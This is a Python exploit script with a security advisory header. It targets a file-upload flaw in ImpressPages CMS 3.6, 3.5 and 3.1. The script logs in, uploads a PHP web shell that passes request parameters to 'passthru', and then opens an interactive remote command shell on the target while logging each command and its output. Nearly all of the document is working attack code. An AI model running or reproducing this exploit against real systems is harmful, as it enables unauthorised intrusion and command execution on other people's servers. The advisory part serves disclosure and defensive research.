#!/usr/bin/python
#
#
# ImpressPages CMS v3.6 manage() Function Remote Code Execution Exploit
#
#
# Vendor: ImpressPages UAB
# Product web page: http://www.impresspages.org
# Affected version: 3.6, 3.5 and 3.1
#
# Summary: ImpressPages CMS is an open source web content management 
system with
# revolutionary drag & drop interface.
#
# Desc: The vulnerability is caused due to the improper verification of 
uploaded
# files in '/ip_cms/modules/developer/config_exp_imp/manager.php' script 
thru the
# 'manage()' function (@line 65) when importing a configuration file. 
This can be
# exploited to execute arbitrary PHP code by uploading a malicious PHP 
script file
# that will be stored in '/file/tmp' directory after successful 
injection.
# Permission Developer[Modules exp/imp] is required (parameter 
'i_n_2[361]' = on)
# for successful exploitation.
#
# Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
#            GNU/Linux CentOS 6.3 (Final)
#            Apache 2.4.2 (Win32) / Apache2
#            PHP 5.4.7 / PHP 5.3.21
#            MySQL 5.5.25a
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2013-5159
# Advisory URL: 
http://zeroscience.mk/en/vulnerabilities/ZSL-2013-5159.php
#
# Vendor: 
http://www.impresspages.org/blog/impresspages-cms-3-7-is-mobile-as-never-before/
#
#
# 12.10.2013
#

ver = '1.0.0.000251'

import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re

from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError

init()

if os.name == 'posix': os.system('clear')
if os.name == 'nt': os.system('cls')
piton = os.path.basename(sys.argv[0])

def bannerche():
	print """
 @---------------------------------------------------------------@
 |                                                               |
 |                 ImpressPages CMS 3.6 RCE 0day                 |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2013-5159                       |
 |                                                               |
 |              Copyleft (c) 2013, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          """
	if len(sys.argv) < 3:
		print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: 
'+Fore.RESET+piton+' <hostname> <path>\n'
		print '\x20\x20[*] '+Fore.CYAN+'Example: 
'+Fore.RESET+piton+' zeroscience.mk impresspages\n'
		sys.exit()

bannerche()

print '\n\x20\x20[*] Initialising exploit 
'+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET

host = sys.argv[1]
path = sys.argv[2]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	opener.open('http://'+host+'/'+path+'/admin.php')
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print '\x20\x20[*] Checking path 
'+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your path 
entry.'+Fore.RESET
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print '\x20\x20[*] Checking host 
'+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your hostname 
entry.'+Fore.RESET
		sys.exit()

print '\x20\x20[*] Checking host and path 
'+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
token_chk = opener.open('http://'+host+'/'+path+'/admin.php')
response = token_chk.read()
match = re.search('(?<=security_token=)\w+', response)
sectoken = match.group(0)

print '\x20\x20[*] Login please.'
username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')

login_data = urllib.urlencode({
							'f_name' : 
username,
							'f_pass' : 
password,
							'action' : 
'login'
							})

login = 
opener.open('http://'+host+'/'+path+'/admin.php?action=login&security_token='+sectoken, 
login_data)
auth = login.read()
for session in cj:
	sessid = session.name

ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)

print '\x20\x20[*] Mapping Session ID 
'+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Cookie: 
'+Fore.YELLOW+cookie+Fore.RESET+'\x20'+'.'*(46 - 
len(cookie))+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Mapping security token 
'+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Token: 
'+Fore.YELLOW+sectoken+Fore.RESET+'\x20'+'.'*15+Fore.GREEN+'[OK]'+Fore.RESET

if re.search(r'Incorrect name or password', auth):
	print '\x20\x20[*] Faulty credentials given 
'+'.'*30+Fore.RED+'[ER]'+Fore.RESET
	sys.exit()
elif re.search(r'Your login suspended for one hour', auth):
	print '\x20\x20[*] Your username is suspended for 1 hour 
'+'.'*17+Fore.RED+'[ER]'+Fore.RESET
	sys.exit()
else:
	print '\x20\x20[*] Authenticated 
'+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET
	print '\x20\x20[*] Sending payload 
'+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 
'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('spec_security_code', 
'12345678901234567890123456789012')
    form.add_field('spec_rand_name', 'lib_php_form_standard_1_')
    
    form.add_file('config', 'liwo.php', 
                  fileHandle=StringIO('<?php echo \"<pre>\"; 
passthru($_GET[\'cmd\']); echo \"</pre>\"; ?>'))

    request = 
urllib2.Request('http://'+host+'/'+path+'/admin.php?module_id=361&action=import&security_token='+sectoken)
    request.add_header('User-agent', 'joxypoxy 1.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()

print '\x20\x20[*] Starting logging service 
'+'.'*30+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Spawning shell '+'.'*40+Fore.GREEN+'[OK]'+Fore.RESET
time.sleep(1)
furl = '/admin.php?module_id=361&action=import_uploaded&security_token='

def osys():
	cmd = 'uname'
	execute = 
opener.open('http://'+host+'/'+path+furl+sectoken+'&cmd='+urllib.quote(cmd))
	reverse = execute.read()
	if re.search(r'Linux', reverse, re.IGNORECASE):
		cmd = 'pwd'
		print Style.DIM+Fore.WHITE
		print '\n\x20\x20[*] Coins: 1'
		print '\x20\x20[*] Detected platform: Linux'
		print '\x20\x20[*] Type \'exit\' to leave'
		print '\x20\x20[*] Choose your CMDs wisely'
		print '\x20\x20[*] Your current location:'
		print Style.RESET_ALL+Fore.RESET
		return cmd
	else:
		cmd = 'cd'
		print Style.DIM+Fore.WHITE
		print '\n\x20\x20[*] Coins: 1'
		print '\x20\x20[*] Detected platform: Windows'
		print '\x20\x20[*] Type \'exit\' to leave'
		print '\x20\x20[*] Choose your CMDs wisely'
		print '\x20\x20[*] Your current location:'
		print Style.RESET_ALL+Fore.RESET
		return cmd

print

today = datetime.date.today()
fname = 
'impress-'+today.strftime('%d-%b-%Y')+time.strftime('_%H%M%S')+'.log'
logging.basicConfig(filename=fname,level=logging.DEBUG)

logging.info(' '+'+'*75)
logging.info(' +')
logging.info(' + Log generated on: '+today.strftime('%A, 
%d-%b-%Y')+time.strftime(', %H:%M:%S'))
logging.info(' + Title: ImpressPages CMS 3.6 manage() Function Remote 
Code Execution')
logging.info(' + Python program executed: '+sys.argv[0])
logging.info(' + Version: '+ver)
logging.info(' + Full query: \''+piton+'\x20'+host+'\x20'+path+'\'')
logging.info(' + Username input: '+username)
logging.info(' + Password input: '+password)
logging.info(' + Vector: '+'http://'+host+'/'+path+furl+sectoken)
logging.info(' +')
logging.info(' + Advisory ID: ZSL-2013-5159')
logging.info(' + Zero Science Lab - http://www.zeroscience.mk')
logging.info(' +')
logging.info(' '+'+'*75+'\n')

print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT 
COIN!\n'+Style.RESET_ALL+Fore.RESET
while True:
	try:
		cmd = raw_input(Fore.RED+'shell@'+host+':~# 
'+Fore.RESET)
		if cmd.strip() == '':
			cmd = osys()

		execute = 
opener.open('http://'+host+'/'+path+furl+sectoken+'&cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)

		print Style.BRIGHT+Fore.CYAN
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print Style.RESET_ALL+Fore.RESET

		if cmd.strip() == 'exit':
			break

		logging.info('Command executed: '+cmd+'\n\nOutput: 
\n'+'='*8+'\n\n'+cmdout.groups()[0].strip()+'\n\n'+'-'*60+'\n')
	except Exception:
		break

logging.warning('\n\n END OF LOG')
print '\x20\x20[*] Carpe commentarius 
'+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] File 
'+Fore.YELLOW+fname+Fore.RESET+'\x20'+'.'*19+Fore.GREEN+'[OK]'+Fore.RESET
sys.exit()
